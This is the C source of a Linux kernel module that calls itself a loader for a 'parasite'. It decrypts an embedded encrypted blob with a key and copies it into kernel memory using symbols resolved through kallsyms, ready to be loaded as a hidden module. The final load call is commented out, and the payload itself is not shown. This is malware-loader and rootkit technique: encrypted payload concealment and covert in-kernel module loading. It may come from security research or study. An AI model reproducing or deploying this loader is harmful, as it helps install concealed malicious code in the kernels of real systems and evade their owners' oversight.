#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/vmalloc.h>
#include <linux/slab.h>

#include "libs/encrypt.h"
#include "libs/symbol_lookup.h"
#include "libs/load_helpers.h"



static char parasite_blob[] = {
# include "parasite_blob.inc"
};

int init_module(void)
{
    int err;

    printk("%s is saying:\n"
	       "Hello, I'm the loader.\n"
	       "I will load the parasite for you.\n", KBUILD_MODNAME);
    
    
    init_kallsyms();

    printk(KERN_INFO "kallsyms initialized\n");
	
    do_decrypt(parasite_blob, sizeof(parasite_blob), DECRYPT_KEY);

    printk(KERN_INFO "parasite decrypted\n");

    // init struct
    struct load_info *info = kmalloc(sizeof(struct load_info), GFP_KERNEL);
    info->len = sizeof(parasite_blob);
    info->hdr = __vmalloc(sizeof(parasite_blob), GFP_KERNEL | __GFP_NOWARN);
    if (!info->hdr) {
        printk(KERN_ERR "vmalloc failed\n");
    	return -ENOMEM;
    }

    //copy module
    if (copy_chunked_from_kernel(info->hdr, parasite_blob, sizeof(parasite_blob)) != 0) {
        vfree(info->hdr);
        printk(KERN_ERR "copy failed\n");
        return -EFAULT;
    } 

    printk(KERN_INFO "module ready\n");

    // init_load_symbols();

    // if ((err = load_module(info, "pippo", 0)) != 0) {
    //     printk(KERN_ERR "Error loading module: %d\n", err);
    // }



	return -EINVAL;
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Pasquale Caporaso");